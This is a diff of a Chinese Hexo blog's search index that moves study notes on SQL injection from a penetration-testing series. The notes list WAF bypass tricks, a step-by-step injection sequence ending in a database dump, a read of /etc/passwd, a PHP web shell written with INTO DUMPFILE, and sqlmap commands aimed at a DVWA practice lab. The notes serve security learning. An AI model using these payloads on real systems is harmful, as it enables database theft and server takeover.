@@ -4,6 +4,46 @@
   
     
     <entry>
+      <title>aaa</title>
+      <link href="/2021/07/31/aaa/"/>
+      <url>/2021/07/31/aaa/</url>
+      
+        <content type="html"><![CDATA[<p>测试</p><a id="more"></a><p>测试</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入（三）Bypass技巧</title>
+      <link href="/2021/02/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89Bypass%E6%8A%80%E5%B7%A7/"/>
+      <url>/2021/02/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89Bypass%E6%8A%80%E5%B7%A7/</url>
+      
+        <content type="html"><![CDATA[<h3 id="SQL注入-Bypass技巧"><a href="#SQL注入-Bypass技巧" class="headerlink" title="SQL注入 Bypass技巧"></a>SQL注入 Bypass技巧</h3><p>Bypass方式的汇总</p><a id="more"></a><h4 id="一些数据库特性"><a href="#一些数据库特性" class="headerlink" title="一些数据库特性"></a>一些数据库特性</h4><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><ul><li>#</li></ul><hr><ul><li>– - </li><li>–+</li><li>//</li><li>/**/</li><li>/*letmetest*/</li><li>;%00</li></ul><h5 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h5><ul><li>MySQL中可以替代空格的字符：<ul><li>/**/</li><li>()</li><li>+</li><li>%20</li><li>%09</li><li>%0a</li><li>0x0a</li><li>0x0b</li><li>0x0c</li><li>0x0d</li><li>+</li><li>-</li><li>~</li><li>.</li></ul></li></ul><p><strong>MySQL特性</strong></p><ul><li><p>MySQL中=为等于，只有在update中是赋值</p></li><li><p><code>：=</code> //赋值</p></li><li><p>@    //加变量名可以直接调用</p></li><li><p>内联注释： /*!50001*/表示数据库版本&gt;=5.00.01时中间的语句才能被执行</p></li></ul><h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><ul><li><p>参数污染绕过</p><ul><li>id=33/<em>id=-33 union select 1,2,3,4,xxxxxx from information_schema xxxx%23\</em>/</li></ul></li><li><p>使用<strong>动态字符串拼接</strong>或<strong>十六进制</strong>，可以避免使用单引号<code>&#39;</code></p><ul><li>select ename,sal from emp where ename = ‘marcus’<ul><li>Oracle: select ename,sal from emp where ename=chr(109)||chr(97)||chr(114)||chr(99)||chr(117)||chr(115)</li><li>MySQL: select ename,sal from emp where ename=char(109)||char(97)||char(114)||char(99)||char(117)||char(115)</li></ul></li><li>select ename,sal from emp where ename=0x6d6172637573</li></ul></li><li><p>设计好注入的数据，可以避开使用注释号 <code>--</code></p><ul><li>‘or 1=1– <ul><li>‘or ‘a’=’a</li></ul></li></ul></li><li><p>通过注释绕开空格</p><ul><li>select/*foo<em>/username,password/*foo</em>/from/*foo/users</li><li>MySQL中，注释可以插入到关键字中<ul><li>sel/*foo/ect username,password fr/*foo/om users</li></ul></li><li>空格：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格</li></ul></li><li><p>绕过等号</p><ul><li>like和等号执行效果一致</li><li>使用&lt;&gt;绕过<ul><li>&lt;&gt;等价于!=，所以在&lt;&gt;前加个！就是等于，比如 where !(id&lt;&gt;2)</li></ul></li><li>rlike</li><li>regexp</li></ul></li><li><p>宽字节注入绕过转义符</p><ul><li>GBK和BIG5适用</li><li>%df’</li></ul></li><li><p>等价字符以及等价函数</p><ul><li>and=&amp;&amp;</li><li>or=||</li><li>xor=^</li><li>not =!</li><li>hex()、bin()=ascii()</li><li>concat_ws=group_concat()</li><li>sleep()=benchmark()</li><li>mid()=、substr()=substring()</li><li>@@user=user()</li><li>@@datadir=datadir()</li></ul></li><li><p>关键字拆分</p><ul><li>se’+’le’+’ct’</li><li>%S%E%L%E%C%T 1</li><li>u/**/nio/**/n/**se/**/lect</li></ul></li><li><p>mysql中不必要使用分号，只要语法正确，解释器就会正确执行</p></li><li><p>select</p><ul><li>SeLeCt(大小写)</li><li>%00select(增加空字节)</li><li>selsecectect(双写)</li><li>%53%45%4c%45%43%53(url编码)</li><li>%2553%2545%254c%2545%2543%2553（多次url编码）</li></ul></li><li><p>Hex编码、URL编码、宽字节、Unicode编码（IIS）支持</p><ul><li>union<ul><li>un%u0069on</li></ul></li></ul></li></ul><h4 id="三、利用过滤逻辑缺陷"><a href="#三、利用过滤逻辑缺陷" class="headerlink" title="三、利用过滤逻辑缺陷"></a>三、利用过滤逻辑缺陷</h4><ul><li>白盒审计</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>pangolin windows上的sql注入集成工具</p></li><li><p>HexorBase</p></li><li><p>一个整理的比较好的博客<a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入（二）SQL注入进阶-报错注入、盲注</title>
       <link href="/2021/02/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%81%E7%9B%B2%E6%B3%A8/"/>
       <url>/2021/02/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%81%E7%9B%B2%E6%B3%A8/</url>
@@ -23,6 +63,33 @@
         <tags>
             
             <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入（一）SQL注入的利用思路</title>
+      <link href="/2021/02/04/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/"/>
+      <url>/2021/02/04/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</url>
+      
+        <content type="html"><![CDATA[<h3 id="SQL注入（一）SQL注入的利用思路"><a href="#SQL注入（一）SQL注入的利用思路" class="headerlink" title="SQL注入（一）SQL注入的利用思路"></a>SQL注入（一）SQL注入的利用思路</h3><p>从检测到拖库的基本流程</p><a id="more"></a><h4 id="一、检测是否存在注入"><a href="#一、检测是否存在注入" class="headerlink" title="一、检测是否存在注入"></a>一、检测是否存在注入</h4><ul><li>基于报错的检测方法<ul><li>’    ”    %    （）</li></ul></li><li>基于布尔的检测<ul><li>1‘ and ‘1’=’1    /    1’ and ‘1</li><li>1’ and ‘1’=2    /    1’ and ‘0</li></ul></li></ul><h4 id="二、查明查询返回的列数"><a href="#二、查明查询返回的列数" class="headerlink" title="二、查明查询返回的列数"></a>二、查明查询返回的列数</h4><p><em>注意：–后必须加一个空格，否则注释不生效</em></p><ul><li>方法1，查询得到执行，说明该列存在，试出最大列数：<ul><li>‘ order by 20 – </li><li>‘ order by 10 – </li><li>‘ order by 5 – </li></ul></li><li>方法2，查询得到执行，说明使用了正确的列数：<ul><li>‘ union select null – </li><li>‘ union select null, null – </li><li>‘ union select null, null, null – </li></ul></li><li>方法3<ul><li>‘ union select 1,2,3,4 – 观察前端返回的是查询到的第几个字段</li></ul></li></ul><h4 id="三、找到一个使用字符串数据类型的列"><a href="#三、找到一个使用字符串数据类型的列" class="headerlink" title="三、找到一个使用字符串数据类型的列"></a>三、找到一个使用字符串数据类型的列</h4><ul><li>注入以下语句，如果查询得到执行，将看到另一行包含a的数据<ul><li>‘ union select ‘a’, null, null –</li><li>‘ union select null, ‘a’, null –</li><li>‘ union select null, null, ‘a’ –</li></ul></li><li>此时可以，把字符串的字段改为数据库的函数<ul><li>‘ union all select database()，null,null –</li><li>‘ union select @@version,null,null –    (Mysql)    </li><li>‘ union select banner,null,null from v$version–    (Oracle)</li></ul></li></ul><!--more--><h4 id="四、获取有用的数据"><a href="#四、获取有用的数据" class="headerlink" title="四、获取有用的数据"></a>四、获取有用的数据</h4><ul><li>一些常用的函数：<ul><li>’ union select database() ,substring_index(USER(),”@”,1)– <ul><li>把USER()执行的结果用@切分，显示第一段</li></ul></li><li>DB用户：user()</li><li>DB版本：version()</li><li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li><li>当前库：database()</li><li>ASCII转字符：char()</li><li>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li><li>MD5(‘b’)</li></ul></li></ul><h4 id="五、拖库"><a href="#五、拖库" class="headerlink" title="五、拖库"></a>五、拖库</h4><h5 id="有权限读取information-schema库"><a href="#有权限读取information-schema库" class="headerlink" title="有权限读取information_schema库"></a>有权限读取information_schema库</h5><ul><li>MySQL数据查询（元数据的表 information_schema）<ul><li>查询有那些库<ul><li>select schema_name from information_schema.schemata;</li><li>select distinct table_schema from information_schema.tables;</li></ul></li><li>查询有哪些表<ul><li>select table_name from information_schema.tables;</li><li>select count(*),table_schema from information_schema.tables group by table_schema //看看每个库各有几张表<ul><li>其中information_schema很有价值，必须要学。</li></ul></li></ul></li><li>查询库中的表名<ul><li>select  table_schema from information_schema.tables where table_schema= ‘dvwa’</li></ul></li><li>查询表中的列名<ul><li>select table_name,column_name from information_schema.columns where table_schema = ‘dvwa’ and table_name=’users’</li></ul></li><li>查询表中数据</li></ul></li></ul><h5 id="无权读取information-schema库-拒绝union、order-by语句"><a href="#无权读取information-schema库-拒绝union、order-by语句" class="headerlink" title="无权读取information_schema库 / 拒绝union、order by语句"></a>无权读取information_schema库 / 拒绝union、order by语句</h5><ul><li><p>第一步、猜列名：<code>&#39; and asd is null --</code></p><ul><li>可以通过返回信息得到 asd这个列是否存在，提前准备好字典。用burp Intruder</li><li><code>find / -name *.column*.txt</code><ul><li>去除以#开头的行<code>cat xxx.txt | grep -v ^# &gt; column.txt</code></li></ul></li></ul></li><li><p>通过列名猜当前表名：<code>&#39; and table.user is null --</code></p><ul><li><code>find / -name *.table.txt</code><ul><li>同样需要去除#开头的行</li></ul></li></ul></li><li><p>猜库名：<code>&#39; and db.table.user is null --</code></p></li><li><p>猜库中的其他表：<code>&#39; and (select count(*) from table)&gt;0 --</code></p></li><li><p>猜表对应关系：<code>&#39; and user.user is null --</code></p></li><li><p>猜字段内容：<code>or user=&#39;admin</code>,<code>or user like &#39;%a%&#39;</code></p></li><li><p>账号对应密码：<code>&#39; or user = &#39;admin&#39; and password = &#39;md5hash&#39;</code></p><ul><li>用md5sum命令把密码字典生成MD5字典，然后intruder</li></ul></li><li><p>可以插入账号密码数据条目<code>&#39;; insert xxxxxx</code>,<code>&#39;;update users set user=&#39;aaa&#39; where user=&#39;bbb&#39;</code></p></li></ul><h4 id="六、其它利用场景"><a href="#六、其它利用场景" class="headerlink" title="六、其它利用场景"></a>六、其它利用场景</h4><ul><li>读取文件<ul><li>select load_file(‘/etc/passwd’)</li></ul></li><li>写入文件<ul><li>select “&lt;?php passthru($_GET[‘cmd’]); ?&gt;” INTO DUMPFILE “/var/www/a.php”<ul><li>DUMPFILE后不加路径的话，默认位置在/var/lib/mysql/dvwa/a.php</li><li>语句中的符号可能会被过滤，可以尝试使用编码绕过，url编码，16进制编码。INTO DUMPFILE 函数会解码。<ul><li><code>cat reverse-shell.php|xxd -ps|tr -d &#39;\n&#39;</code><ul><li>xxd -ps 生成的二进制文件中会有换行符，需要用tr来去掉</li></ul></li><li>select (0x1111111111111) into dumpfile “/tmp/c.php”</li></ul></li></ul></li><li>写入到/tmp文件夹（777权限），然后include到页面中，include成为当前页面的一部分，而当前页面是有执行权限的</li></ul></li><li>保存下载数据库<ul><li>select select (0x1111111111111) into outfile “/tmp/a.db”</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>判断是否存在</li><li>查明列数</li><li>找到string类型位置</li><li>查询，利用</li></ol><p>权限最小化，权限分离</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
             
         </tags>
       
@@ -954,60 +1021,6 @@
       <url>/2020/10/20/SQLMap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-Target/</url>
       
         <content type="html"><![CDATA[<h3 id="SQLMap自动注入"><a href="#SQLMap自动注入" class="headerlink" title="SQLMap自动注入"></a>SQLMap自动注入</h3><ul><li>开源sql注入漏洞检测、利用工具</li><li>检测动态页面中get/post参数、cookie、http头</li><li>数据榨取</li><li>文件系统访问</li><li>操作系统命令执行</li><li>引擎强大、特性丰富</li><li>Xss漏洞检测</li></ul><a id="more"></a><h4 id="五种检测技术"><a href="#五种检测技术" class="headerlink" title="五种检测技术"></a>五种检测技术</h4><ul><li>基于布尔的盲注检测</li><li>基于时间的盲注检测<ul><li>‘ and (select * from (select(sleep(20)))a)– </li></ul></li><li>基于错误的检测</li><li>基于UNION联合查询的检测<ul><li>适用于通过for循环直接输出联合查询结果，否则只显示第一项结果。</li></ul></li><li>基于堆叠查询的检测<ul><li>；堆叠多个查询语句</li><li>适用于非select的数据修改、删除操作</li></ul></li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul><li>数据库直连 -d</li><li>与burpsuite、google结合使用，支持正则表达式限定测试目标。</li><li>Get、post、cookie、referer、User_Agent（随机或指定）<ul><li>Cookie过期后自动处理Set-Cookie头，更新cookie信息</li></ul></li><li>限速：最大并发，延迟并发</li><li>支持Basic、Digest、NTLM、CA身份认证</li><li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表、列名称</li><li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问Windows注册表</li><li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门。</li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><h5 id="GET方法测试"><a href="#GET方法测试" class="headerlink" title="GET方法测试"></a>GET方法测试</h5><ul><li>-u ，要测试的链接<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot;</code></li></ul></li><li>-f，获得数据库指纹信息</li><li>–users，获得数据库用户数据</li><li>–banner，获得banner信息</li><li>–dbs，目标数据库中有哪些库<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; --dbs</code></li></ul></li><li>-D 数据库 –tables,查看库中有哪些表<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa --tables</code></li></ul></li><li>-D 数据库 -T 表名 –columns<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa -T users --columns</code></li></ul></li><li>-dump<ul><li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa -T users -dump</code></li></ul></li><li>–schema，元数据</li><li>-a ，所有的</li><li>-d，直连 <ul><li><code>sqlmap -d &quot;mysql://user:password@192.168.20.10:3306/dvwa -f --users&quot;</code></li></ul></li><li>-m，要测试链接列表文件</li><li>-g，扫描google搜索结果<ul><li><code>sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></li></ul></li></ul><h5 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h5><ul><li>使用http请求文件（直接把burpsuite拦截到的请求粘贴到文本文件）<ul><li><code>sqlmap -r request.txt --dbs</code></li></ul></li><li>使用burpsuitelog文件（burpsuite的Option-&gt;misc-&gt;logging）<ul><li><code>sqlmap -l log.txt</code></li></ul></li></ul><h5 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h5><ul><li><code>sqlmap -u &quot;xxxxxxxxxxxxxx&quot; --force-ssl</code></li></ul><h5 id="扫描配置文件"><a href="#扫描配置文件" class="headerlink" title="扫描配置文件"></a>扫描配置文件</h5><ul><li><code>sqlmap -c sqlmap.conf</code></li><li>默认的config文件/etc/sqlmap/sqlmap.conf</li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 信息安全 </category>
-          
-          <category> 渗透测试 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> KaliLinux渗透测试学习笔记 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL注入（三）Bypass技巧</title>
-      <link href="/2020/10/19/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89Bypass%E6%8A%80%E5%B7%A7/"/>
-      <url>/2020/10/19/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89Bypass%E6%8A%80%E5%B7%A7/</url>
-      
-        <content type="html"><![CDATA[<h3 id="SQL注入-Bypass技巧"><a href="#SQL注入-Bypass技巧" class="headerlink" title="SQL注入 Bypass技巧"></a>SQL注入 Bypass技巧</h3><p>Bypass方式的汇总</p><a id="more"></a><h4 id="一些数据库特性"><a href="#一些数据库特性" class="headerlink" title="一些数据库特性"></a>一些数据库特性</h4><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><ul><li>#</li></ul><hr><ul><li>– - </li><li>–+</li><li>//</li><li>/**/</li><li>/*letmetest*/</li><li>;%00</li></ul><h5 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h5><ul><li>MySQL中可以替代空格的字符：<ul><li>/**/</li><li>()</li><li>+</li><li>%20</li><li>%09</li><li>%0a</li><li>0x0a</li><li>0x0b</li><li>0x0c</li><li>0x0d</li><li>+</li><li>-</li><li>~</li><li>.</li></ul></li></ul><p><strong>MySQL特性</strong></p><ul><li><p>MySQL中=为等于，只有在update中是赋值</p></li><li><p><code>：=</code> //赋值</p></li><li><p>@    //加变量名可以直接调用</p></li><li><p>内联注释： /*!50001*/表示数据库版本&gt;=5.00.01时中间的语句才能被执行</p></li></ul><h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><ul><li><p>参数污染绕过</p><ul><li>id=33/<em>id=-33 union select 1,2,3,4,xxxxxx from information_schema xxxx%23\</em>/</li></ul></li><li><p>使用<strong>动态字符串拼接</strong>或<strong>十六进制</strong>，可以避免使用单引号<code>&#39;</code></p><ul><li>select ename,sal from emp where ename = ‘marcus’<ul><li>Oracle: select ename,sal from emp where ename=chr(109)||chr(97)||chr(114)||chr(99)||chr(117)||chr(115)</li><li>MySQL: select ename,sal from emp where ename=char(109)||char(97)||char(114)||char(99)||char(117)||char(115)</li></ul></li><li>select ename,sal from emp where ename=0x6d6172637573</li></ul></li><li><p>设计好注入的数据，可以避开使用注释号 <code>--</code></p><ul><li>‘or 1=1– <ul><li>‘or ‘a’=’a</li></ul></li></ul></li><li><p>通过注释绕开空格</p><ul><li>select/*foo<em>/username,password/*foo</em>/from/*foo/users</li><li>MySQL中，注释可以插入到关键字中<ul><li>sel/*foo/ect username,password fr/*foo/om users</li></ul></li><li>空格：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格</li></ul></li><li><p>绕过等号</p><ul><li>like和等号执行效果一致</li><li>使用&lt;&gt;绕过<ul><li>&lt;&gt;等价于!=，所以在&lt;&gt;前加个！就是等于，比如 where !(id&lt;&gt;2)</li></ul></li><li>rlike</li><li>regexp</li></ul></li><li><p>宽字节注入绕过转义符</p><ul><li>GBK和BIG5适用</li><li>%df’</li></ul></li><li><p>等价字符以及等价函数</p><ul><li>and=&amp;&amp;</li><li>or=||</li><li>xor=^</li><li>not =!</li><li>hex()、bin()=ascii()</li><li>concat_ws=group_concat()</li><li>sleep()=benchmark()</li><li>mid()=、substr()=substring()</li><li>@@user=user()</li><li>@@datadir=datadir()</li></ul></li><li><p>关键字拆分</p><ul><li>se’+’le’+’ct’</li><li>%S%E%L%E%C%T 1</li><li>u/**/nio/**/n/**se/**/lect</li></ul></li><li><p>mysql中不必要使用分号，只要语法正确，解释器就会正确执行</p></li><li><p>select</p><ul><li>SeLeCt(大小写)</li><li>%00select(增加空字节)</li><li>selsecectect(双写)</li><li>%53%45%4c%45%43%53(url编码)</li><li>%2553%2545%254c%2545%2543%2553（多次url编码）</li></ul></li><li><p>Hex编码、URL编码、宽字节、Unicode编码（IIS）支持</p><ul><li>union<ul><li>un%u0069on</li></ul></li></ul></li></ul><h4 id="三、利用过滤逻辑缺陷"><a href="#三、利用过滤逻辑缺陷" class="headerlink" title="三、利用过滤逻辑缺陷"></a>三、利用过滤逻辑缺陷</h4><ul><li>白盒审计</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>pangolin windows上的sql注入集成工具</p></li><li><p>HexorBase</p></li><li><p>一个整理的比较好的博客<a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 信息安全 </category>
-          
-          <category> 渗透测试 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> KaliLinux渗透测试学习笔记 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL注入（一）SQL注入的利用思路</title>
-      <link href="/2020/10/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/"/>
-      <url>/2020/10/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</url>
-      
-        <content type="html"><![CDATA[<h3 id="SQL注入（一）SQL注入的利用思路"><a href="#SQL注入（一）SQL注入的利用思路" class="headerlink" title="SQL注入（一）SQL注入的利用思路"></a>SQL注入（一）SQL注入的利用思路</h3><p>从检测到拖库的基本流程</p><a id="more"></a><h4 id="一、检测是否存在注入"><a href="#一、检测是否存在注入" class="headerlink" title="一、检测是否存在注入"></a>一、检测是否存在注入</h4><ul><li>基于报错的检测方法<ul><li>’    ”    %    （）</li></ul></li><li>基于布尔的检测<ul><li>1‘ and ‘1’=’1    /    1’ and ‘1</li><li>1’ and ‘1’=2    /    1’ and ‘0</li></ul></li></ul><h4 id="二、查明查询返回的列数"><a href="#二、查明查询返回的列数" class="headerlink" title="二、查明查询返回的列数"></a>二、查明查询返回的列数</h4><p><em>注意：–后必须加一个空格，否则注释不生效</em></p><ul><li>方法1，查询得到执行，说明该列存在，试出最大列数：<ul><li>‘ order by 20 – </li><li>‘ order by 10 – </li><li>‘ order by 5 – </li></ul></li><li>方法2，查询得到执行，说明使用了正确的列数：<ul><li>‘ union select null – </li><li>‘ union select null, null – </li><li>‘ union select null, null, null – </li></ul></li><li>方法3<ul><li>‘ union select 1,2,3,4 – 观察前端返回的是查询到的第几个字段</li></ul></li></ul><h4 id="三、找到一个使用字符串数据类型的列"><a href="#三、找到一个使用字符串数据类型的列" class="headerlink" title="三、找到一个使用字符串数据类型的列"></a>三、找到一个使用字符串数据类型的列</h4><ul><li>注入以下语句，如果查询得到执行，将看到另一行包含a的数据<ul><li>‘ union select ‘a’, null, null –</li><li>‘ union select null, ‘a’, null –</li><li>‘ union select null, null, ‘a’ –</li></ul></li><li>此时可以，把字符串的字段改为数据库的函数<ul><li>‘ union all select database()，null,null –</li><li>‘ union select @@version,null,null –    (Mysql)    </li><li>‘ union select banner,null,null from v$version–    (Oracle)</li></ul></li></ul><!--more--><h4 id="四、获取有用的数据"><a href="#四、获取有用的数据" class="headerlink" title="四、获取有用的数据"></a>四、获取有用的数据</h4><ul><li>一些常用的函数：<ul><li>’ union select database() ,substring_index(USER(),”@”,1)– <ul><li>把USER()执行的结果用@切分，显示第一段</li></ul></li><li>DB用户：user()</li><li>DB版本：version()</li><li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li><li>当前库：database()</li><li>ASCII转字符：char()</li><li>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li><li>MD5(‘b’)</li></ul></li></ul><h4 id="五、拖库"><a href="#五、拖库" class="headerlink" title="五、拖库"></a>五、拖库</h4><h5 id="有权限读取information-schema库"><a href="#有权限读取information-schema库" class="headerlink" title="有权限读取information_schema库"></a>有权限读取information_schema库</h5><ul><li>MySQL数据查询（元数据的表 information_schema）<ul><li>查询有那些库<ul><li>select schema_name from information_schema.schemata;</li><li>select distinct table_schema from information_schema.tables;</li></ul></li><li>查询有哪些表<ul><li>select table_name from information_schema.tables;</li><li>select count(*),table_schema from information_schema.tables group by table_schema //看看每个库各有几张表<ul><li>其中information_schema很有价值，必须要学。</li></ul></li></ul></li><li>查询库中的表名<ul><li>select  table_schema from information_schema.tables where table_schema= ‘dvwa’</li></ul></li><li>查询表中的列名<ul><li>select table_name,column_name from information_schema.columns where table_schema = ‘dvwa’ and table_name=’users’</li></ul></li><li>查询表中数据</li></ul></li></ul><h5 id="无权读取information-schema库-拒绝union、order-by语句"><a href="#无权读取information-schema库-拒绝union、order-by语句" class="headerlink" title="无权读取information_schema库 / 拒绝union、order by语句"></a>无权读取information_schema库 / 拒绝union、order by语句</h5><ul><li><p>第一步、猜列名：<code>&#39; and asd is null --</code></p><ul><li>可以通过返回信息得到 asd这个列是否存在，提前准备好字典。用burp Intruder</li><li><code>find / -name *.column*.txt</code><ul><li>去除以#开头的行<code>cat xxx.txt | grep -v ^# &gt; column.txt</code></li></ul></li></ul></li><li><p>通过列名猜当前表名：<code>&#39; and table.user is null --</code></p><ul><li><code>find / -name *.table.txt</code><ul><li>同样需要去除#开头的行</li></ul></li></ul></li><li><p>猜库名：<code>&#39; and db.table.user is null --</code></p></li><li><p>猜库中的其他表：<code>&#39; and (select count(*) from table)&gt;0 --</code></p></li><li><p>猜表对应关系：<code>&#39; and user.user is null --</code></p></li><li><p>猜字段内容：<code>or user=&#39;admin</code>,<code>or user like &#39;%a%&#39;</code></p></li><li><p>账号对应密码：<code>&#39; or user = &#39;admin&#39; and password = &#39;md5hash&#39;</code></p><ul><li>用md5sum命令把密码字典生成MD5字典，然后intruder</li></ul></li><li><p>可以插入账号密码数据条目<code>&#39;; insert xxxxxx</code>,<code>&#39;;update users set user=&#39;aaa&#39; where user=&#39;bbb&#39;</code></p></li></ul><h4 id="六、其它利用场景"><a href="#六、其它利用场景" class="headerlink" title="六、其它利用场景"></a>六、其它利用场景</h4><ul><li>读取文件<ul><li>select load_file(‘/etc/passwd’)</li></ul></li><li>写入文件<ul><li>select “&lt;?php passthru($_GET[‘cmd’]); ?&gt;” INTO DUMPFILE “/var/www/a.php”<ul><li>DUMPFILE后不加路径的话，默认位置在/var/lib/mysql/dvwa/a.php</li><li>语句中的符号可能会被过滤，可以尝试使用编码绕过，url编码，16进制编码。INTO DUMPFILE 函数会解码。<ul><li><code>cat reverse-shell.php|xxd -ps|tr -d &#39;\n&#39;</code><ul><li>xxd -ps 生成的二进制文件中会有换行符，需要用tr来去掉</li></ul></li><li>select (0x1111111111111) into dumpfile “/tmp/c.php”</li></ul></li></ul></li><li>写入到/tmp文件夹（777权限），然后include到页面中，include成为当前页面的一部分，而当前页面是有执行权限的</li></ul></li><li>保存下载数据库<ul><li>select select (0x1111111111111) into outfile “/tmp/a.db”</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>判断是否存在</li><li>查明列数</li><li>找到string类型位置</li><li>查询，利用</li></ol><p>权限最小化，权限分离</p>]]></content>
       
       
       <categories>
